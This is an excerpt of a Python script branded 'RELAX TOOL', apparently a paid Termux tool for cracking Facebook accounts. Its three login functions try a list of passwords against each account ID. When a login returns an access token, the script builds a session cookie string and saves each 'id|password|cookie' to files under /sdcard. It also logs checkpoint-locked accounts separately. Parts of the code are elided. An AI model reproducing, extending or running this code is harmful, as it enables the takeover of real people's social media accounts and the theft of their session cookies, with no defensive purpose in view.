#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FULL SCRIPT ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
# OWNER BY SCRIPT : MR RELAX
# GITHUB LINK : SKBER-CYBER
# MACK BY : JAHID HASAN 
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ IMPORT MODULES ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
print("\x1b[38;5;46m➤\x1b[1;97m WELCOME RELAX TOOL")
print("\x1b[38;5;46m➤\x1b[1;97m INJOY A PAID TOOL ")
print("\x1b[38;5;46m➤\x1b[1;97m YOUR FATHER It'z MASUM")
from os import path
...
def apv():
	try:
		clear()
		x = requests.get("https://github.com/bothacker33/Relax/blob/main/Approved").text
...
{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{A}[{R}={A}] {G}FACEBOOK   {R} >>   {A} It'z MASUM
{A}[{R}={A}] {G}STATUS      {R}>>   {A}FILE {R}X{A} RANDOM
{A}[{R}={A}] {G}VERSION   {R}  >>   {A}0.1
{A}[{R}={A}] {G}GITHUB    {R}  >>   {A}https://github.com/CYBER-71
{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ MENU ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def Main():
        try:
...
def api1(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\r{R}[{G}RELAX-F1{R}] >> {R}[{A}{loop}{R}]{R} >> {R}[{G}OK{A}•{G}{len(oks)}{R}]");sys.stdout.flush()
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                ...
                print(f'\r\r{R}[{G}RELAX{R}•{G}OK{R}•{G}💚{R}]{G} '+ids+f' {R}•{G} '+pas+'')
                open('/sdcard/RELAX-FILE-M1-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}[RELAX-CP{R}] '+ids+f' | '+pas+'')
                open('/sdcard/RELAX-FILE-M1-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
...
def api2(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\r{R}[{G}RELAX-F2{R}] >> {R}[{A}{loop}{R}]{R} >> {R}[{G}OK{A}•{G}{len(oks)}{R}]");sys.stdout.flush()
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                ...
                print(f'\r\r{R}[RELAX-CP{R}] '+ids+f' | '+pas+'')
                open('/sdcard/RELAX-FILE-M2-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                cps.append(ids)
                break
            else:continue
        loop+=1
...
def api3(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\r{R}[{G}RELAX-F3{R}] >> {R}[{A}{loop}{R}]{R} >> {R}[{G}OK{A}•{G}{len(oks)}{R}]");sys.stdout.flush()
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r{R}[{G}RELAX{R}•{G}OK{R}•{G}💚{R}]{G} '+ids+f' {R}•{G} '+pas+'')
                open('/sdcard/RELAX-FILE-M3-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}[RELAX-CP{R}] '+ids+f' | '+pas+'')
                open('/sdcard/RELAX-FILE-M3-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
